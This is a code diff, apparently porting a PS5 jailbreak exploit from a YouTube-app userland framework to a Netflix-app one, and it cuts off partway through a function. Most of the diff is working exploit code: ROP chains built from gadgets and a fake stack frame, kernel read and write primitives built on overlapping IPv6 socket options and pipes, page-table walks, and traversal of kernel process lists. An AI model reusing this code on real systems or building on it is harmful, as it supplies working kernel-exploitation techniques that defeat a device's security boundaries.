@@ -1,9 +1,10 @@
 /*
- * p2jb-y2jb - PS5 jailbreak port to Y2JB (YouTube/JS), tested on FW 11.60,
+ * p2jb-y2jb - PS5 jailbreak port to Netflix-N-Hack (Netflix/JS), tested on FW 10.60,
  *            offsets bundled for FW 9.00 - 12.40.
  * MIT License - see LICENSE.
  *
  * Credits:
+ *   - P2JB Y2JB port: matem6 (https://github.com/matem6/P2JB-Y2JB-Porting)
  *   - p2jb kernel exploit (cr_ref overflow via kqueueex): Gezine / cheburek3000
  *     (https://github.com/Gezine/Luac0re)
  *   - Y2JB userland framework: Gezine (https://github.com/Gezine/Y2JB)
@@ -14,773 +15,143 @@
  * Usage: see README.md.
  */
 
-PAGE_SIZE = 0x4000;
-PHYS_PAGE_SIZE = 0x1000;
 
-LIBC_HANDLE = 0x2n;
-LIBKERNEL_HANDLE = 0x2001n;
-
-let ROP = {
-    get pop_rsp()             { return g.get('pop_rsp');               },
-    get pop_rax()             { return g.get('pop_rax');               },
-    get pop_rdi()             { return g.get('pop_rdi');               },
-    get pop_rsi()             { return g.get('pop_rsi');               },
-    get pop_rdx()             { return g.get('pop_rdx');               },
-    get pop_rcx()             { return g.get('pop_rcx');               },
-    get pop_r8()              { return g.get('pop_r8');                },
-    get ret()                 { return g.get('ret');                   },
-    get mov_qword_rdi_rax()   { return g.get('mov_qword_ptr_rdi_rax'); },
-};
-
-MAIN_CORE = 4;
-MAIN_RTPRIO = 0x100;
-NUM_WORKERS = 2;
-NUM_GROOMS = 0x200;
-NUM_HANDLES = 0x100;
-NUM_SDS = 64;
-NUM_SDS_ALT = 48;
-NUM_RACES = 100;
-NUM_ALIAS = 100;
-LEAK_LEN = 16;
-NUM_LEAKS = 16;
-NUM_CLOBBERS = 8;
-MAX_AIO_IDS = 0x80;
-
-AIO_CMD_READ = 1n;
-AIO_CMD_FLAG_MULTI = 0x1000n;
-AIO_CMD_MULTI_READ = 0x1001n;
-AIO_CMD_WRITE = 2n;
-AIO_STATE_COMPLETE = 3n;
-AIO_STATE_ABORTED = 4n;
-
-SCE_KERNEL_ERROR_ESRCH = 0x80020003n;
-
-RTP_SET = 1n;
-PRI_REALTIME = 2n;
-
-block_fd = 0xffffffffffffffffn;
-unblock_fd = 0xffffffffffffffffn;
-block_id = -1n;
-groom_ids = null;
-sds = null;
-sds_alt = null;
-prev_core = -1;
-prev_rtprio = 0n;
-ready_signal = 0n;
-deletion_signal = 0n;
-pipe_buf = 0n;
-
-saved_fpu_ctrl = 0;
-saved_mxcsr = 0;
-
-/***** misc.js *****/
-function find_pattern(buffer, pattern_string) {
-    const parts = pattern_string.split(' ');
-    const matches = [];
-
-    for (let i = 0; i <= buffer.length - parts.length; i++) {
-        let match = true;
-
-        for (let j = 0; j < parts.length; j++) {
-            if (parts[j] === '?') continue;
-            if (buffer[i + j] !== parseInt(parts[j], 16)) {
-                match = false;
-                break;
-            }
-        }
-
-        if (match) matches.push(i);
-    }
-
-    return matches;
-}
-
-function call_pipe_rop(fildes) {
-
-    write64(add_rop_smash_code_store, 0xab0025n);
-    real_rbp = addrof(rop_smash(1)) + 0x700000000n -1n +2n;
-
-    let rop_i = 0;
-
-    fake_rop[rop_i++] = g.get('pop_rax'); // pop rax ; ret
-    fake_rop[rop_i++] = SYSCALL.pipe;
-    fake_rop[rop_i++] = syscall_wrapper;
-
-    // Store rax (read_fd) to fildes[0]
-    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
-    fake_rop[rop_i++] = fildes;
-    fake_rop[rop_i++] = g.get('mov_qword_ptr_rdi_rax'); // mov qword [rdi], rax ; ret
-
-    // Store rdx (write_fd) to fildes[4]
-    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
-    fake_rop[rop_i++] = fildes + 4n;
-    fake_rop[rop_i++] = g.get('mov_qword_ptr_rdi_rdx'); // mov qword [rdi], rdx ; ret
-
-    // Return safe tagged value to JavaScript
-    fake_rop[rop_i++] = g.get('pop_rax'); // mov rax, 0x200000000 ; ret
-    fake_rop[rop_i++] = 0x2000n;                   // Fake value in RAX to make JS happy
-    fake_rop[rop_i++] = g.get('pop_rsp_pop_rbp');
-    fake_rop[rop_i++] = real_rbp;
-
-    write64(add_rop_smash_code_store, 0xab00260325n);
-    oob_arr[39] = base_heap_add + fake_frame;
-    return rop_smash(obj_arr[0]);          // Call ROP
-}
-
-function create_pipe() {
-    const fildes = malloc(0x10);
-
-    call_pipe_rop(fildes);
-
-    const read_fd = read32_uncompressed(fildes);
-    const write_fd = read32_uncompressed(fildes + 4n);
-    //logger.log("This are the created pipes: " + hex(read_fd) + " " + hex(write_fd));
-    return [read_fd, write_fd];
-}
-
-function read_buffer(addr, len) {
-    const buffer = new Uint8Array(len);
-    for (let i = 0; i < len; i++) {
-        buffer[i] = Number(read8_uncompressed(addr + BigInt(i)));
-    }
-    return buffer;
-}
-
-function write_buffer(addr, buffer) {
-    for (let i = 0; i < buffer.length; i++) {
-        write8_uncompressed(addr + BigInt(i), buffer[i]);
-    }
-}
-
-function get_nidpath() {
-    const path_buffer = malloc(0x255);
-    const len_ptr = malloc(8);
-
-    write64_uncompressed(len_ptr, 0x255n);
-
-    const ret = syscall(SYSCALL.randomized_path, 0n, path_buffer, len_ptr);
-    if (ret === 0xffffffffffffffffn) {
-        throw new Error("randomized_path failed : " + hex(ret));
-    }
-
-    return read_cstring(path_buffer);
-}
-
-function check_jailbroken() {
-    if (!is_jailbroken()) {
-        throw new Error("process is not jailbroken");
-    }
-}
-
-function file_exists(path) {
-    const path_addr = alloc_string(path);
-    const fd = syscall(SYSCALL.open, path_addr, O_RDONLY);
-
-    if (fd !== 0xffffffffffffffffn) {
-        syscall(SYSCALL.close, fd);
-        return true;
-    } else {
-        return false;
-    }
-}
-
-function read_file(path) {
-    const path_addr = alloc_string(path);
-    const fd = syscall(SYSCALL.open, path_addr, O_RDONLY);
-
-    if (fd === 0xffffffffffffffffn) {
-        throw new Error("file not exist: " + path);
-    }
-
-    const stat_buf = malloc(0x100);
-    const fstat_result = syscall(SYSCALL.fstat, fd, stat_buf);
-    if (fstat_result === 0xffffffffffffffffn) {
-        syscall(SYSCALL.close, fd);
-        throw new Error("fstat failed for: " + path);
-    }
-
-    const file_size = read64_uncompressed(stat_buf + 0x48n);
-
-    const buffer = malloc(Number(file_size));
-    const bytes_read = syscall(SYSCALL.read, fd, buffer, file_size);
-
-    syscall(SYSCALL.close, fd);
-
-    if (bytes_read !== file_size) {
-        throw new Error("failed to read complete file: " + path);
-    }
-
-    return read_buffer(buffer, Number(file_size));
-}
-
-function write_file(path, text) {
-    const mode = 0x1ffn; // 777
-    const path_addr = alloc_string(path);
-    const data_addr = alloc_string(text);
-
-    const flags = O_CREAT | O_WRONLY | O_TRUNC;
-    const fd = syscall(SYSCALL.open, path_addr, flags, mode);
-
-    if (fd === 0xffffffffffffffffn) {
-        throw new Error("open failed for " + path + " fd: " + hex(fd));
-    }
-
-    const written = syscall(SYSCALL.write, fd, data_addr, BigInt(text.length));
-    if (written === 0xffffffffffffffffn) {
-        syscall(SYSCALL.close, fd);
-        throw new Error("write failed : " + hex(written));
-    }
-
-    syscall(SYSCALL.close, fd);
-    return Number(written); // number of bytes written
-}
-
-function write_file_binary(path, data) {
-    const path_addr = alloc_string(path);
-    const fd = syscall(SYSCALL.open, path_addr, O_CREAT | O_WRONLY | O_TRUNC, 0x1ffn);
-    if (fd === 0xffffffffffffffffn) throw new Error("open failed: " + path);
-    const buf = malloc(data.length);
-    write_buffer(buf, data);
-    const written = syscall(SYSCALL.write, fd, buf, BigInt(data.length));
-    syscall(SYSCALL.close, fd);
-    if (written !== BigInt(data.length)) throw new Error("write incomplete: " + written + " of " + data.length);
-    return Number(written);
-}
-
-function copy_file(src, dst) {
-    const CHUNK = 0x10000n; // 64KB chunks - avoids large V8 heap allocation
-    const src_fd = syscall(SYSCALL.open, alloc_string(src), O_RDONLY);
-    if (src_fd === 0xffffffffffffffffn) throw new Error("open failed: " + src);
-
-    const dst_fd = syscall(SYSCALL.open, alloc_string(dst), O_CREAT | O_WRONLY | O_TRUNC, 0x1ffn);
-    if (dst_fd === 0xffffffffffffffffn) {
-        syscall(SYSCALL.close, src_fd);
-        throw new Error("open failed: " + dst);
-    }
-
-    const buf = malloc(Number(CHUNK));
-    let total = 0;
-    while (true) {
-        const nr = syscall(SYSCALL.read, src_fd, buf, CHUNK);
-        if (nr === 0n || nr === 0xffffffffffffffffn) break;
-        const nw = syscall(SYSCALL.write, dst_fd, buf, nr);
-        if (nw !== nr) {
-            syscall(SYSCALL.close, src_fd);
-            syscall(SYSCALL.close, dst_fd);
-            throw new Error("write failed at offset " + total);
-        }
-        total += Number(nr);
-    }
-    syscall(SYSCALL.close, src_fd);
-    syscall(SYSCALL.close, dst_fd);
-    return total;
-}
-
-function usb_is_mounted(u) {
-    // Compare st_dev of /mnt/usbX against /mnt — if they differ, a filesystem is mounted there
-    const mnt_stat = malloc(0x100);
-    const usb_stat = malloc(0x100);
-    const r1 = syscall(SYSCALL.stat, alloc_string("/mnt"), mnt_stat);
-    const r2 = syscall(SYSCALL.stat, alloc_string("/mnt/usb" + u), usb_stat);
-    if (r1 === 0xffffffffffffffffn || r2 === 0xffffffffffffffffn) return false;
-    return read64_uncompressed(mnt_stat) !== read64_uncompressed(usb_stat);
-}
-
-/***** kernel.js *****/
-kernel = {
-    addr: {},
-    copyout: null,
-    copyin: null,
-    read_buffer: null,
-    write_buffer: null
-};
-
-kernel.read_byte = function(kaddr) {
-    const value = kernel.read_buffer(kaddr, 1);
-    return value && value.length === 1 ? BigInt(value[0]) : null;
-};
-
-kernel.read_word = function(kaddr) {
-    const value = kernel.read_buffer(kaddr, 2);
-    if (!value || value.length !== 2) return null;
-    return BigInt(value[0]) | (BigInt(value[1]) << 8n);
-};
-
-kernel.read_dword = function(kaddr) {
-    const value = kernel.read_buffer(kaddr, 4);
-    if (!value || value.length !== 4) return null;
-    let result = 0n;
-    for (let i = 0; i < 4; i++) {
-        result |= (BigInt(value[i]) << BigInt(i * 8));
-    }
-    return result;
-};
-
-kernel.read_qword = function(kaddr) {
-    const value = kernel.read_buffer(kaddr, 8);
-    if (!value || value.length !== 8) return null;
-    let result = 0n;
-    for (let i = 0; i < 8; i++) {
-        result |= (BigInt(value[i]) << BigInt(i * 8));
-    }
-    return result;
-};
-
-kernel.read_null_terminated_string = function(kaddr) {
-    //const decoder = new TextDecoder('utf-8');
-    let result = "";
-
-    while (true) {
-        const chunk = kernel.read_buffer(kaddr, 0x8);
-        if (!chunk || chunk.length === 0) break;
-
-        let null_pos = -1;
-        for (let i = 0; i < chunk.length; i++) {
-            if (chunk[i] === 0) {
-                null_pos = i;
-                break;
-            }
-        }
-
-        if (null_pos >= 0) {
-            if (null_pos > 0) {
-                for(let i = 0; i < null_pos; i++)
-                {
-                    result += String.fromCharCode(Number(chunk[i]));
-                }
-            }
-            return result;
-        }
-
-        for(let i = 0; i < chunk.length; i++)
-        {
-            result += String.fromCharCode(Number(chunk[i]));
-        }
-
-        kaddr = kaddr + BigInt(chunk.length);
-    }
-
-    return result;
-};
-
-kernel.write_byte = function(dest, value) {
-    const buf = new Uint8Array(1);
-    buf[0] = Number(value & 0xFFn);
-    kernel.write_buffer(dest, buf);
-};
-
-kernel.write_word = function(dest, value) {
-    const buf = new Uint8Array(2);
-    buf[0] = Number(value & 0xFFn);
-    buf[1] = Number((value >> 8n) & 0xFFn);
-    kernel.write_buffer(dest, buf);
-};
-
-kernel.write_dword = function(dest, value) {
-    const buf = new Uint8Array(4);
-    for (let i = 0; i < 4; i++) {
-        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
-    }
-    kernel.write_buffer(dest, buf);
-};
-
-kernel.write_qword = function(dest, value) {
-    const buf = new Uint8Array(8);
-    for (let i = 0; i < 8; i++) {
-        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
-    }
-    kernel.write_buffer(dest, buf);
-};
-
-ipv6_kernel_rw = {
-    data: {},
-    ofiles: null,
-    kread8: null,
-    kwrite8: null
-};
-
-ipv6_kernel_rw.init = function(ofiles, kread8, kwrite8) {
-    ipv6_kernel_rw.ofiles = ofiles;
-    ipv6_kernel_rw.kread8 = kread8;
-    ipv6_kernel_rw.kwrite8 = kwrite8;
-
-    ipv6_kernel_rw.create_pipe_pair();
-    ipv6_kernel_rw.create_overlapped_ipv6_sockets();
-};
-
-ipv6_kernel_rw.get_fd_data_addr = function(fd) {
-    const filedescent_addr = ipv6_kernel_rw.ofiles + BigInt(fd) * kernel_offset.SIZEOF_OFILES;
-    const file_addr = ipv6_kernel_rw.kread8(filedescent_addr + 0x0n);
-    return ipv6_kernel_rw.kread8(file_addr + 0x0n);
-};
-
-ipv6_kernel_rw.create_pipe_pair = function() {
-    const [read_fd, write_fd] = create_pipe();
-
-    ipv6_kernel_rw.data.pipe_read_fd = read_fd;
-    ipv6_kernel_rw.data.pipe_write_fd = write_fd;
-    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd);
-    ipv6_kernel_rw.data.pipemap_buffer = malloc(0x14);
-    ipv6_kernel_rw.data.read_mem = malloc(PAGE_SIZE);
-};
-
-ipv6_kernel_rw.create_overlapped_ipv6_sockets = function() {
-    const master_target_buffer = malloc(0x14);
-    const slave_buffer = malloc(0x14);
-    const pktinfo_size_store = malloc(0x8);
-
-    write64_uncompressed(pktinfo_size_store, 0x14n);
-
-    const master_sock = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
-    const victim_sock = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
-
-    syscall(SYSCALL.setsockopt, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14n);
-    syscall(SYSCALL.setsockopt, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14n);
-
-    const master_so = ipv6_kernel_rw.get_fd_data_addr(master_sock);
-    const master_pcb = ipv6_kernel_rw.kread8(master_so + kernel_offset.SO_PCB);
-    const master_pktopts = ipv6_kernel_rw.kread8(master_pcb + kernel_offset.INPCB_PKTOPTS);
-
-    const slave_so = ipv6_kernel_rw.get_fd_data_addr(victim_sock);
-    const slave_pcb = ipv6_kernel_rw.kread8(slave_so + kernel_offset.SO_PCB);
-    const slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb + kernel_offset.INPCB_PKTOPTS);
-
-    ipv6_kernel_rw.kwrite8(master_pktopts + 0x10n, slave_pktopts + 0x10n);
-
-    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer;
-    ipv6_kernel_rw.data.slave_buffer = slave_buffer;
-    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store;
-    ipv6_kernel_rw.data.master_sock = master_sock;
-    ipv6_kernel_rw.data.victim_sock = victim_sock;
-};
-
-ipv6_kernel_rw.ipv6_write_to_victim = function(kaddr) {
-    write64_uncompressed(ipv6_kernel_rw.data.master_target_buffer, kaddr);
-    write64_uncompressed(ipv6_kernel_rw.data.master_target_buffer + 0x8n, 0n);
-    write32_uncompressed(ipv6_kernel_rw.data.master_target_buffer + 0x10n, 0n);
-    syscall(SYSCALL.setsockopt, ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6,
-            IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14n);
-};
-
-ipv6_kernel_rw.ipv6_kread = function(kaddr, buffer_addr) {
-    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
-    syscall(SYSCALL.getsockopt, ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6,
-            IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store);
-};
-
-ipv6_kernel_rw.ipv6_kwrite = function(kaddr, buffer_addr) {
-    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
-    syscall(SYSCALL.setsockopt, ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6,
-            IPV6_PKTINFO, buffer_addr, 0x14n);
-};
-
-ipv6_kernel_rw.ipv6_kread8 = function(kaddr) {
-    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer);
-    return read64_uncompressed(ipv6_kernel_rw.data.slave_buffer);
-};
-
-ipv6_kernel_rw.copyout = function(kaddr, uaddr, len) {
-   if (kaddr === null || kaddr === undefined ||
-       uaddr === null || uaddr === undefined ||
-       len === null || len === undefined || len === 0n) {
-       throw new Error("copyout: invalid arguments");
-   }
-
-    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, 0x4000000040000000n);
-    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0x4000000000000000n);
-    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
-    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);
-
-    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
-    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0n);
-    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
-    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10n, ipv6_kernel_rw.data.pipemap_buffer);
-
-    syscall(SYSCALL.read, ipv6_kernel_rw.data.pipe_read_fd, uaddr, len);
-};
-
-ipv6_kernel_rw.copyin = function(uaddr, kaddr, len) {
-   if (kaddr === null || kaddr === undefined ||
-       uaddr === null || uaddr === undefined ||
-       len === null || len === undefined || len === 0n) {
-       throw new Error("copyout: invalid arguments");
-   }
-
-
-    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, 0n);
-    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0x4000000000000000n);
-    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
-    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);
-
-    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
-    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0n);
-    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
-    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10n, ipv6_kernel_rw.data.pipemap_buffer);
-
-    syscall(SYSCALL.write, ipv6_kernel_rw.data.pipe_write_fd, uaddr, len);
-};
-
-ipv6_kernel_rw.read_buffer = function(kaddr, len) {
-    let mem = ipv6_kernel_rw.data.read_mem;
-    if (len > PAGE_SIZE) {
-        mem = malloc(len);
-    }
-
-    ipv6_kernel_rw.copyout(kaddr, mem, BigInt(len));
-    return read_buffer(mem, len);
-};
-
-ipv6_kernel_rw.write_buffer = function(kaddr, buf) {
-    const temp_addr = malloc(buf.length);
-    write_buffer(temp_addr, buf);
-    ipv6_kernel_rw.copyin(temp_addr, kaddr, BigInt(buf.length));
-};
-
-// CPU page table definitions
-CPU_PDE_SHIFT = {
-    PRESENT: 0,
-    RW: 1,
-    USER: 2,
-    WRITE_THROUGH: 3,
-    CACHE_DISABLE: 4,
-    ACCESSED: 5,
-    DIRTY: 6,
-    PS: 7,
-    GLOBAL: 8,
-    XOTEXT: 58,
-    PROTECTION_KEY: 59,
-    EXECUTE_DISABLE: 63
-};
-
-CPU_PDE_MASKS = {
-    PRESENT: 1n,
-    RW: 1n,
-    USER: 1n,
-    WRITE_THROUGH: 1n,
-    CACHE_DISABLE: 1n,
-    ACCESSED: 1n,
-    DIRTY: 1n,
-    PS: 1n,
-    GLOBAL: 1n,
-    XOTEXT: 1n,
-    PROTECTION_KEY: 0xfn,
-    EXECUTE_DISABLE: 1n
-};
-
-CPU_PG_PHYS_FRAME = 0x000ffffffffff000n;
-CPU_PG_PS_FRAME = 0x000fffffffe00000n;
-
-function cpu_pde_field(pde, field) {
-    const shift = CPU_PDE_SHIFT[field];
-    const mask = CPU_PDE_MASKS[field];
-    return Number((pde >> BigInt(shift)) & mask);
-}
-
-function cpu_walk_pt(cr3, vaddr) {
-    if (!vaddr || !cr3) {
-        throw new Error("cpu_walk_pt: invalid arguments");
-    }
-
-    const pml4e_index = (vaddr >> 39n) & 0x1ffn;
-    const pdpe_index = (vaddr >> 30n) & 0x1ffn;
-    const pde_index = (vaddr >> 21n) & 0x1ffn;
-    const pte_index = (vaddr >> 12n) & 0x1ffn;
-
-    const pml4e = kernel.read_qword(phys_to_dmap(cr3) + pml4e_index * 8n);
-    if (cpu_pde_field(pml4e, "PRESENT") !== 1) {
-        return null;
-    }
-
-    const pdp_base_pa = pml4e & CPU_PG_PHYS_FRAME;
-    const pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8n;
-    const pdpe = kernel.read_qword(pdpe_va);
-
-    if (cpu_pde_field(pdpe, "PRESENT") !== 1) {
-        return null;
-    }
-
-    const pd_base_pa = pdpe & CPU_PG_PHYS_FRAME;
-    const pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8n;
-    const pde = kernel.read_qword(pde_va);
-
-    if (cpu_pde_field(pde, "PRESENT") !== 1) {
-        return null;
-    }
-
-    if (cpu_pde_field(pde, "PS") === 1) {
-        return (pde & CPU_PG_PS_FRAME) | (vaddr & 0x1fffffn);
-    }
-
-    const pt_base_pa = pde & CPU_PG_PHYS_FRAME;
-    const pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
-    const pte = kernel.read_qword(pte_va);
-
-    if (cpu_pde_field(pte, "PRESENT") !== 1) {
-        return null;
-    }
-
-    return (pte & CPU_PG_PHYS_FRAME) | (vaddr & 0x3fffn);
-}
-
-function is_kernel_rw_available() {
-    return kernel.read_buffer && kernel.write_buffer;
-}
-
-function check_kernel_rw() {
-    if (!is_kernel_rw_available()) {
-        throw new Error("kernel r/w is not available");
-    }
-}
-
-function find_proc_by_name(name) {
-    check_kernel_rw();
-    if (!kernel.addr.allproc) {
-        throw new Error("kernel.addr.allproc not set");
-    }
-
-    let proc = kernel.read_qword(kernel.addr.allproc);
-    while (proc !== 0n) {
-        const proc_name = kernel.read_null_terminated_string(proc + kernel_offset.PROC_COMM);
-        if (proc_name === name) {
-            return proc;
-        }
-        proc = kernel.read_qword(proc + 0x0n);
-    }
-
-    return null;
-}
-
-function find_proc_by_pid(pid) {
-    check_kernel_rw();
-    if (!kernel.addr.allproc) {
-        throw new Error("kernel.addr.allproc not set");
-    }
-
-    const target_pid = BigInt(pid);
-    let proc = kernel.read_qword(kernel.addr.allproc);
-    while (proc !== 0n) {
-        const proc_pid = kernel.read_dword(proc + kernel_offset.PROC_PID);
-        if (proc_pid === target_pid) {
-            return proc;
-        }
-        proc = kernel.read_qword(proc + 0x0n);
-    }
-
-    return null;
-}
-
-function get_proc_cr3(proc) {
-    check_kernel_rw();
-
-    const vmspace = kernel.read_qword(proc + kernel_offset.PROC_VM_SPACE);
-    const pmap_store = kernel.read_qword(vmspace + kernel_offset.VMSPACE_VM_PMAP);
-    return kernel.read_qword(pmap_store + kernel_offset.PMAP_CR3);
-}
-
-function virt_to_phys(virt_addr, cr3) {
-    check_kernel_rw();
-    if (!kernel.addr.dmap_base)
-        throw new Error("virt_to_phys: no kernel.addr.dmap_base");
-    if (!virt_addr)
-        throw new Error("virt_to_phys: no virt_addr");
-    cr3 = cr3 || kernel.addr.kernel_cr3;
-    return cpu_walk_pt(cr3, virt_addr);
-}
-
-function phys_to_dmap(phys_addr) {
-    if (!kernel.addr.dmap_base)
-        throw new Error("phys_to_dmap: no kernel.addr.dmap_base");
-    if (!phys_addr)
-        throw new Error("phys_to_dmap: no phys_addr");
-    return kernel.addr.dmap_base + phys_addr;
-}
-
-function find_vmspace_pmap_offset() {
-    const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);
-
-    // Note, this is the offset of vm_space.vm_map.pmap on 1.xx.
-    // It is assumed that on higher firmwares it's only increasing'
-    const cur_scan_offset = 0x1C8n;
-
-    for (let i = 1; i <= 6; i++) {
-        const scan_val = kernel.read_qword(vmspace + cur_scan_offset + BigInt(i * 8));
-        const offset_diff = Number(scan_val - vmspace);
-
-        if (offset_diff >= 0x2C0 && offset_diff <= 0x2F0) {
-            return cur_scan_offset + BigInt(i * 8);
-        }
-    }
-
-    throw new Error("failed to find VMSPACE_VM_PMAP offset");
-}
-
-
-function find_vmspace_vmid_offset() {
-    const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);
-
-    // Note, this is the offset of vm_space.vm_map.vmid on 1.xx.
-    // It is assumed that on higher firmwares it's only increasing'
-    const cur_scan_offset = 0x1D4n;
-
-    for (let i = 1; i <= 8; i++) {
-        const scan_offset = cur_scan_offset + BigInt(i * 4);
-        const scan_val = Number(kernel.read_dword(vmspace + scan_offset));
-
-        if (scan_val > 0 && scan_val <= 0x10) {
-            return scan_offset;
-        }
-    }
-
-    throw new Error("failed to find VMSPACE_VM_VMID offset");
-}
-
-function find_proc_offsets() {
-    const proc_data = kernel.read_buffer(kernel.addr.curproc, 0x1000);
-
-    const p_comm_sign = find_pattern(proc_data, "ce fa ef be cc bb");
-    const p_sysent_sign = find_pattern(proc_data, "ff ff ff ff ff ff ff 7f");
-
-    if (p_comm_sign.length === 0) {
-        throw new Error("failed to find offset for PROC_COMM");
-    }
-
-    if (p_sysent_sign.length === 0) {
-        throw new Error("failed to find offset for PROC_SYSENT");
-    }
-
-    const p_comm_offset = BigInt(p_comm_sign[0] + 0x8);
-    const p_sysent_offset = BigInt(p_sysent_sign[0] - 0x10);
-
-    return {
-        PROC_COMM: p_comm_offset,
-        PROC_SYSENT: p_sysent_offset
-    };
-}
-
-function find_additional_offsets() {
-    const proc_offsets = find_proc_offsets();
-
-    const vm_map_pmap_offset = find_vmspace_pmap_offset();
-    const vm_map_vmid_offset = find_vmspace_vmid_offset();
-
-    return {
-        PROC_COMM: proc_offsets.PROC_COMM,
-        PROC_SYSENT: proc_offsets.PROC_SYSENT,
-        VMSPACE_VM_PMAP: vm_map_pmap_offset,
-        VMSPACE_VM_VMID: vm_map_vmid_offset,
-    };
-}
-
-function update_kernel_offsets() {
-    const offsets = find_additional_offsets();
-
-    for (const [key, value] of Object.entries(offsets)) {
-        kernel_offset[key] = value;
-    }
-}
-
+// p2jb
 
 (function () {
+
+    /***** misc.js *****/
+    function find_pattern(buffer, pattern_string) {
+        const parts = pattern_string.split(' ');
+        const matches = [];
+
+        for (let i = 0; i <= buffer.length - parts.length; i++) {
+            let match = true;
+
+            for (let j = 0; j < parts.length; j++) {
+                if (parts[j] === '?') continue;
+                if (buffer[i + j] !== parseInt(parts[j], 16)) {
+                    match = false;
+                    break;
+                }
+            }
+
+            if (match) matches.push(i);
+        }
+
+        return matches;
+    }
+
+    function call_pipe_rop(fildes) {
+        write64(add_rop_smash_code_store, 0xab0025n);
+        real_rbp = addrof(rop_smash(1)) + 0x700000000n -1n +2n;
+
+        let rop_i = 0;
+
+        fake_rop[rop_i++] = g.get('pop_rax'); // pop rax ; ret
+        fake_rop[rop_i++] = SYSCALL.pipe;
+        fake_rop[rop_i++] = syscall_wrapper;
+
+        // Store rax (read_fd) to fildes[0]
+        fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
+        fake_rop[rop_i++] = fildes;
+        fake_rop[rop_i++] = g.get('mov_qword_ptr_rdi_rax'); // mov qword [rdi], rax ; ret
+
+        // Store rdx (write_fd) to fildes[4]
+        fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
+        fake_rop[rop_i++] = fildes + 4n;
+        fake_rop[rop_i++] = g.get('mov_qword_ptr_rdi_rdx'); // mov qword [rdi], rdx ; ret
+
+        // Return safe tagged value to JavaScript
+        fake_rop[rop_i++] = g.get('pop_rax'); // mov rax, 0x200000000 ; ret
+        fake_rop[rop_i++] = 0x2000n;                   // Fake value in RAX to make JS happy
+        fake_rop[rop_i++] = g.get('pop_rsp_pop_rbp');
+        fake_rop[rop_i++] = real_rbp;
+
+        write64(add_rop_smash_code_store, 0xab00260325n);
+        oob_arr[39] = base_heap_add + fake_frame;
+        return rop_smash(obj_arr[0]);          // Call ROP
+    }
+
+    function create_pipe() {
+        const fildes = malloc(0x10);
+
+        call_pipe_rop(fildes);
+
+        const read_fd = read32_uncompressed(fildes);
+        const write_fd = read32_uncompressed(fildes + 4n);
+        //logger.log("This are the created pipes: " + hex(read_fd) + " " + hex(write_fd));
+        return [read_fd, write_fd];
+    }
+
+    function read_buffer(addr, len) {
+        const buffer = new Uint8Array(len);
+        for (let i = 0; i < len; i++) {
+            buffer[i] = Number(read8_uncompressed(addr + BigInt(i)));
+        }
+        return buffer;
+    }
+
+    function write_buffer(addr, buffer) {
+        for (let i = 0; i < buffer.length; i++) {
+            write8_uncompressed(addr + BigInt(i), buffer[i]);
+        }
+    }
+
+    function get_nidpath() {
+        const path_buffer = malloc(0x255);
+        const len_ptr = malloc(8);
+
+        write64_uncompressed(len_ptr, 0x255n);
+
+        const ret = syscall(SYSCALL.randomized_path, 0n, path_buffer, len_ptr);
+        if (ret === 0xffffffffffffffffn) {
+            throw new Error("randomized_path failed : " + hex(ret));
+        }
+
+        return read_cstring(path_buffer);
+    }
+
+    function check_jailbroken() {
+        if (!is_jailbroken()) {
+            throw new Error("process is not jailbroken");
+        }
+    }
+
+    function file_exists(path) {
+        const path_addr = alloc_string(path);
+        const fd = syscall(SYSCALL.open, path_addr, O_RDONLY);
+
+        if (fd !== 0xffffffffffffffffn) {
